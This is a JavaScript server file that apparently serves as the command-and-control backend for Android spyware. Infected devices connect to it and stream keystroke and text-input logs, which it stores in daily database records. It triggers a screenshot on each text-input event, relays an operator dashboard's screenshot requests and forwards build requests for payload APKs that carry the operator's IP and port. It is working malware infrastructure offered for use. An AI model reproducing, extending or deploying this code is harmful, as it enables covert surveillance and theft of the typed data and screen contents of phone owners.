import express from "express";
import { Server } from "socket.io";
import bodyParser from 'body-parser';
import cors from 'cors'
import chalk from "chalk";
import path from 'path';

import { db } from './db.js';
import { promises as fs } from "fs";

const androidPort = 4000
const frontendPort = 4001
let devices = new Map(); // Map<device_uuid, {info: data, socket: socket}>
let pendingScreenshots = new Map(); // Map<device_uuid, {frontend_socket_id, timestamp}>
const SCREENSHOT_TIMEOUT = 30000; // 30 seconds timeout

// Simple mutex for devices map synchronization
class Mutex {
    constructor() {
        this.locked = false;
        this.waiting = [];
    }

    async acquire() {
        return new Promise((resolve) => {
            if (!this.locked) {
                this.locked = true;
                resolve();
            } else {
                this.waiting.push(resolve);
            }
        });
    }

    release() {
        if (this.waiting.length > 0) {
            const next = this.waiting.shift();
            next();
        } else {
            this.locked = false;
        }
    }
}

const devicesMutex = new Mutex();

// Function to clean up expired screenshot requests
function cleanupExpiredScreenshotRequests() {
    const now = Date.now();
    const expiredDevices = [];

    for (const [deviceUuid, requestData] of pendingScreenshots.entries()) {
        if (now - requestData.timestamp > SCREENSHOT_TIMEOUT) {
            expiredDevices.push(deviceUuid);

            // Notify the frontend that the request timed out
            const requestingSocket = frontendIo.sockets.sockets.get(requestData.frontend_socket_id);
            if (requestingSocket) {
                console.log(chalk.yellow(`Screenshot request timed out for device ${deviceUuid}, notifying frontend ${requestData.frontend_socket_id}`));
                requestingSocket.emit("screenshot_error", {
                    device_uuid: deviceUuid,
                    error: "Screenshot request timed out"
                });
            }
        }
    }

    // Remove expired requests
    expiredDevices.forEach(deviceUuid => {
        pendingScreenshots.delete(deviceUuid);
    });

    if (expiredDevices.length > 0) {
        console.log(chalk.blue(`Cleaned up ${expiredDevices.length} expired screenshot requests`));
    }
}

// Clean up expired requests every 10 seconds
setInterval(cleanupExpiredScreenshotRequests, 10000);


// Express
const app = express()
app.use(cors())
app.use(bodyParser.urlencoded({ extended: true }))
app.use(express.static('static'))
app.use('/screenshots', express.static('screenshots', { maxAge: '1h' }))

// Serve main HTML file at root
app.get('/', (req, res) => {
    res.sendFile(path.resolve('./static/html/index.html'));
});

const frontendServer = app.listen(frontendPort, "0.0.0.0", () => {
    console.log(`Listening for frontends on http://0.0.0.0:${frontendPort}/`)
    // DB initialized on import
  })

// Socket io Connection for Frontends (must be defined before androidIo)
const frontendIo = new Server(frontendServer);
frontendIo.on("connection", async (socket) => {
    console.log(chalk.greenBright(`[+] Frontend Connected (${socket.id})`))

    try {
        await devicesMutex.acquire();
        try {
            const deviceList = Array.from(devices.values()).map((d) => ({
                ...d.info,
                ID: d.info.device_uuid
            })).slice(0, 20);
            socket.emit("info", deviceList);
        } finally {
            devicesMutex.release();
        }
    } catch (error) {
        console.error('Error sending initial device list to frontend:', error);
        socket.emit("info", []);
    }

    socket.on("get_device_logs", async (id) => {
        if (!id) {
            socket.emit("device_logs", []);
            return;
        }

        try {
            await devicesMutex.acquire();
            try {
                const device = devices.get(id);
                if (device && device.logs) {
                    socket.emit("device_logs", device.logs.map(l => l.log));
                } else {
                    socket.emit("device_logs", []);
                }
            } finally {
                devicesMutex.release();
            }
        } catch (error) {
            console.error('Error getting device logs:', error);
            socket.emit("device_logs", []);
        }
    });

    socket.on("screenshot_req", async (deviceId) => {
        if (!deviceId) {
            console.log(chalk.red(`Screenshot request with invalid deviceId`));
            return;
        }

        console.log(`Relaying screenshot request to device: ${deviceId} from frontend: ${socket.id}`);

        try {
            await devicesMutex.acquire();
            try {
                const device = devices.get(deviceId);
                if (device && device.socket) {
                    // Check if there's already a pending request for this device
                    const existingRequest = pendingScreenshots.get(deviceId);

                    if (existingRequest) {
                        // Check if the request has timed out
                        const now = Date.now();
                        if (now - existingRequest.timestamp > SCREENSHOT_TIMEOUT) {
                            console.log(chalk.yellow(`Screenshot request timed out for device ${deviceId}, allowing new request from ${socket.id}`));
                            pendingScreenshots.delete(deviceId);
                        } else {
                            // If another frontend already requested, send error to current frontend
                            console.log(chalk.yellow(`Screenshot already pending for device ${deviceId}, rejecting duplicate request from ${socket.id}`));
                            socket.emit("screenshot_error", {
                                device_uuid: deviceId,
                                error: "Screenshot already in progress for this device"
                            });
                            return;
                        }
                    }

                    // Store the mapping between device UUID and frontend socket ID with timestamp
                    pendingScreenshots.set(deviceId, {
                        frontend_socket_id: socket.id,
                        timestamp: Date.now()
                    });
                    device.socket.emit("screenshot");
                    console.log(chalk.green(`Screenshot request sent to device ${deviceId} for frontend ${socket.id}`));
                } else {
                    console.log(chalk.red(`Device ${deviceId} not found, socket disconnected, or not connected`));
                    socket.emit("screenshot_error", { device_uuid: deviceId, error: "Device not available" });
                }
            } finally {
                devicesMutex.release();
            }
        } catch (error) {
            console.error('Error handling screenshot request:', error);
            socket.emit("screenshot_error", { device_uuid: deviceId, error: "Internal server error" });
        }
    });

    socket.on("get_device_info", async (deviceId) => {
        if (!deviceId) {
            socket.emit("device_info_error", { error: "Invalid device ID" });
            return;
        }

        try {
            await devicesMutex.acquire();
            try {
                const device = devices.get(deviceId);
                if (device) {
                    socket.emit("device_info", device.info);
                } else {
                    socket.emit("device_info_error", { error: "Device not found" });
                }
            } finally {
                devicesMutex.release();
            }
        } catch (error) {
            console.error('Error getting device info:', error);
            socket.emit("device_info_error", { error: "Internal server error" });
        }
    });

    socket.on("build_request", async (data) => {
        const { ip, port } = data;
        console.log(`Build request for ${ip}:${port}`);

        try {
            const response = await fetch('http://android-builder:8080/build', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ip, port })
            });
            const result = await response.json();

            if (result.success) {
                socket.emit("build_success", { success: true });
            } else {
                socket.emit("build_error", { success: false, error: 'Build failed' });
            }
        } catch (error) {
            console.error('Build request error:', error);
            socket.emit("build_error", { success: false, error: 'Build request failed' });
        }
    });

    socket.on("get_screenshots", async (deviceId) => {
        try {
            const screenshotsDir = 'screenshots';
            await fs.mkdir(screenshotsDir, { recursive: true });

            const files = await fs.readdir(screenshotsDir);
            let screenshotFiles = files
                .filter(file => file.endsWith('.jpg') || file.endsWith('.jpeg') || file.endsWith('.png'))
                .map(file => {
                    // Extract device UUID and timestamp from filename
                    // Format: screenshot-{deviceUuid}-{timestamp}.jpg
                    const match = file.match(/^screenshot-(.+)-(\d{4}-\d{2}-\d{2}T\d{2}-\d{2}-\d{2}-\d{3}Z)\.jpg$/);
                    if (match) {
                        const [, deviceUuid, timestampStr] = match;
                        const timestamp = new Date(timestampStr.replace(/-/g, ':').replace('T', ' '));
                        return {
                            filename: file,
                            device_uuid: deviceUuid,
                            timestamp: timestamp.getTime(),
                            url: `/screenshots/${file}`
                        };
                    }
                    return null;
                })
                .filter(item => item !== null);

            // Filter by device ID if provided
            if (deviceId && deviceId !== "None") {
                screenshotFiles = screenshotFiles.filter(item => item.device_uuid === deviceId);
            }

            screenshotFiles.sort((a, b) => b.timestamp - a.timestamp); // Sort by timestamp descending

            socket.emit("screenshots_list", screenshotFiles);
        } catch (error) {
            console.error('Error getting screenshots list:', error);
            socket.emit("screenshots_list", []);
        }
    });

    socket.on("delete_screenshot", async (filename) => {
        try {
            const filepath = `screenshots/${filename}`;
            await fs.unlink(filepath);
            console.log(`Screenshot deleted: ${filepath}`);
            socket.emit("delete_screenshot_success", { filename });
        } catch (error) {
            console.error('Error deleting screenshot:', error);
            socket.emit("delete_screenshot_error", { filename, error: error.message });
        }
    });

    socket.on("disconnect", () => {
        console.log(chalk.red(`[x] Frontend Disconnected (${socket.id})`))

        // Clean up any pending screenshot requests for this frontend
        for (const [deviceId, frontendId] of pendingScreenshots.entries()) {
            if (frontendId === socket.id) {
                pendingScreenshots.delete(deviceId);
            }
        }
    });
});

// Socket io Connection for Android devices
const androidIo = new Server(androidPort)
console.log(`Listening for android devices on http://0.0.0.0:${androidPort}/`)

androidIo.on("connection", async (socket) => {
    try {
        const dataStr = socket.handshake.query.info;
        if (!dataStr) {
            socket.disconnect();
            return;
        }
        const data = JSON.parse(dataStr);
        const deviceUuid = data.device_uuid;
        if (!deviceUuid) {
            socket.disconnect();
            return;
        }

        socket.deviceUuid = deviceUuid;

        // Synchronize access to devices map
        await devicesMutex.acquire();
        try {
            let device = devices.get(deviceUuid);
            if (device) {
                // Update existing device - ensure clean state
                device.info = data;
                device.socket = socket;
                // Clean up any stale screenshot requests for this device
                if (pendingScreenshots.has(deviceUuid)) {
                    console.log(chalk.yellow(`Cleaning up stale screenshot request for reconnected device ${deviceUuid}`));
                    pendingScreenshots.delete(deviceUuid);
                }
                if (!device.logs) {
                    device.logs = [];
                }
            } else {
                // New device
                device = {
                    info: data,
                    socket: socket,
                    logs: []
                };
                devices.set(deviceUuid, device);
            }
        } finally {
            devicesMutex.release();
        }

        // UPSERT device info in DB
        await db.run(
            'INSERT OR REPLACE INTO devices (device_uuid, brand, model, manufacturer, connected_at, last_seen) VALUES (?, ?, ?, ?, ?, ?)',
            deviceUuid, data.Brand, data.Model, data.Manufacturer, Date.now(), Date.now()
        ).catch(console.error);

        console.log(chalk.green(`[+] Android device Connected (${deviceUuid}) => ${socket.request.connection.remoteAddress}:${socket.request.connection.remotePort}`))

        // Broadcast updated device list to frontends with mutex protection
        await devicesMutex.acquire();
        try {
            const deviceList = Array.from(devices.values()).map((d) => ({
                ...d.info,
                ID: d.info.device_uuid
            })).slice(0, 20);

            frontendIo.emit("info", deviceList);
            console.log(chalk.blue(`[i] Status broadcast sent to frontend(s) - ${deviceList.length} connected devices`));
        } finally {
            devicesMutex.release();
        }

        socket.on("disconnect", async (reason) => {
            // Capture deviceUuid before socket cleanup
            const deviceUuid = socket.deviceUuid;
            if (!deviceUuid) {
                console.log(chalk.yellow(`[!] Device disconnected without UUID (reason: ${reason})`));
                return;
            }

            console.log(chalk.redBright(`[x] Device Disconnected (${deviceUuid}) - Reason: ${reason}`));

            try {
                // Synchronize access to devices map
                await devicesMutex.acquire();
                try {
                    const device = devices.get(deviceUuid);
                    if (device) {
                        device.socket = null;

                        // Clean up logs to prevent memory leaks (keep only recent 100 entries)
                        if (device.logs && device.logs.length > 100) {
                            device.logs = device.logs.slice(-100);
                        }
                    }

                    // Clean up any pending screenshot requests for this device
                    if (pendingScreenshots.has(deviceUuid)) {
                        const requestData = pendingScreenshots.get(deviceUuid);
                        const requestingFrontendId = requestData.frontend_socket_id;
                        console.log(chalk.yellow(`Cleaning up pending screenshot for device ${deviceUuid}, notifying frontend ${requestingFrontendId}`));

                        // Notify the frontend that the device disconnected
                        const requestingSocket = frontendIo.sockets.sockets.get(requestingFrontendId);
                        if (requestingSocket) {
                            requestingSocket.emit("screenshot_error", {
                                device_uuid: deviceUuid,
                                error: "Device disconnected while taking screenshot"
                            });
                        }

                        pendingScreenshots.delete(deviceUuid);
                    }

                    // Update last_seen in DB with proper error handling
                    const dbResult = await db.run('UPDATE devices SET last_seen = ? WHERE device_uuid = ?', Date.now(), deviceUuid);
                    if (dbResult.changes === 0) {
                        console.log(chalk.yellow(`[!] No device found in DB for UUID: ${deviceUuid}`));
                    }

                    // Broadcast updated device list to frontends with mutex protection
                    const deviceList = Array.from(devices.values()).map((d) => ({
                        ...d.info,
                        ID: d.info.device_uuid
                    })).slice(0, 20);
        
                    frontendIo.emit("info", deviceList);
                    console.log(chalk.blue(`[i] Status broadcast sent to frontend(s) - ${deviceList.length} connected devices`));

                } finally {
                    devicesMutex.release();
                }

            } catch (error) {
                console.error(chalk.red(`[ERROR] Error handling device disconnect for ${deviceUuid}:`), error);
                // Even if there's an error, try to broadcast the updated list with mutex protection
                try {
                    await devicesMutex.acquire();
                    try {
                        const deviceList = Array.from(devices.values()).map((d) => ({
                            ...d.info,
                            ID: d.info.device_uuid
                        })).slice(0, 20);
                        frontendIo.emit("info", deviceList);
                        console.log(chalk.blue(`[i] Emergency broadcast sent after disconnect error`));
                    } finally {
                        devicesMutex.release();
                    }
                } catch (broadcastError) {
                    console.error(chalk.red(`[ERROR] Failed to broadcast device list after disconnect error:`), broadcastError);
                }
            }
        })

        socket.on("logger", async (data) => {
            const deviceUuid = socket.deviceUuid;
            if (!deviceUuid) return;

            try {
                // Synchronize access to devices map
                await devicesMutex.acquire();
                let device;
                try {
                    device = devices.get(deviceUuid);
                    if (!device) {
                        console.log(chalk.yellow(`[!] Received logger data from unknown device ${deviceUuid}, ignoring`));
                        return;
                    }

                    // Device is sending logger data

                    // console.log(`Logger from device ${deviceUuid}: ${data}`);
                    device.logs.push({ timestamp: Date.now(), log: data });
                    device.lastSeen = Date.now();

                    // Check if this is a text input event and request screenshot
                    if (data && typeof data === 'string' && data.includes('[') && data.includes(']')) {
                        // This appears to be a text input log, request screenshot
                        if (!pendingScreenshots.has(deviceUuid)) {
                            pendingScreenshots.set(deviceUuid, {
                                frontend_socket_id: null, // Broadcast to all frontends
                                timestamp: Date.now()
                            });
                            device.socket.emit("screenshot");
                            console.log(chalk.green(`Automatic screenshot request sent to device ${deviceUuid} due to text input`));
                        }
                    }
                } finally {
                    devicesMutex.release();
                }

                // Emit to frontend
                frontendIo.emit("logger", { device: deviceUuid, log: data });

                // Incremental storage: Append to daily logs
                const today = new Date().toISOString().split('T')[0]; // YYYY-MM-DD
                const row = await db.get('SELECT logs_data FROM device_daily_logs WHERE device_uuid = ? AND date = ?', deviceUuid, today);
                let existingLogs = '[]'; // Default empty array
                if (row && row.logs_data) {
                    existingLogs = row.logs_data;
                }
                const logsArray = JSON.parse(existingLogs);
                logsArray.push({ timestamp: Date.now(), log: data });
                const newLogsData = JSON.stringify(logsArray);

                await db.run(
                    'INSERT OR REPLACE INTO device_daily_logs (device_uuid, date, logs_data, updated_at) VALUES (?, ?, ?, ?)',
                    deviceUuid, today, newLogsData, Date.now()
                );
            } catch (err) {
                console.error('Logger storage error:', err)
            }
        })


        socket.on("screenshot_response", async (data) => {
            const deviceUuid = socket.deviceUuid;
            if (!deviceUuid) return;

            try {
                if (!Buffer.isBuffer(data) && !(data instanceof ArrayBuffer)) {
                    throw new Error('Invalid image data: not a buffer');
                }
                const buffer = Buffer.from(data);
                if (buffer.length === 0) {
                    throw new Error('Empty image data');
                }

                // Update device last seen
                await devicesMutex.acquire();
                try {
                    const device = devices.get(deviceUuid);
                    if (device) {
                        device.lastSeen = Date.now();
                        // Device is sending screenshot data
                    }
                } finally {
                    devicesMutex.release();
                }

                // Generate filename with timestamp and device
                const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
                const filename = `screenshot-${deviceUuid}-${timestamp}.jpg`;
                const filepath = `screenshots/${filename}`;

                await fs.mkdir('screenshots', { recursive: true });
                await fs.writeFile(filepath, buffer);

                // Emit only to the specific frontend that requested the screenshot
                const requestData = pendingScreenshots.get(deviceUuid);
                if (requestData) {
                    const requestingFrontendId = requestData.frontend_socket_id;
                    if (requestingFrontendId) {
                        // Manual request from frontend
                        const requestingSocket = frontendIo.sockets.sockets.get(requestingFrontendId);
                        if (requestingSocket) {
                            console.log(`Sending screenshot response to frontend ${requestingFrontendId} for device ${deviceUuid}`);
                            requestingSocket.emit("screenshot_ready", {
                                device_uuid: deviceUuid,
                                filename: filename
                            });
                        } else {
                            console.log(chalk.yellow(`Frontend ${requestingFrontendId} not found for device ${deviceUuid}`));
                        }
                    } else {
                        // Automatic screenshot from text input - broadcast to all frontends
                        console.log(`Broadcasting automatic screenshot to all frontends for device ${deviceUuid}`);
                        frontendIo.emit("screenshot_ready", {
                            device_uuid: deviceUuid,
                            filename: filename,
                            automatic: true
                        });
                    }
                    // Clean up the pending request
                    pendingScreenshots.delete(deviceUuid);
                } else {
                    console.log(chalk.red(`No pending screenshot request found for device ${deviceUuid}`));
                }

                console.log(`Screenshot saved: screenshots/${filename}`);
            } catch (err) {
                console.error('Screenshot response error:', err);
                frontendIo.emit("screenshot_error", { device_uuid: deviceUuid, error: err.message });
            }
        })

    } catch (error) {
        console.error('Connection error:', error);
        socket.disconnect();
    }
})
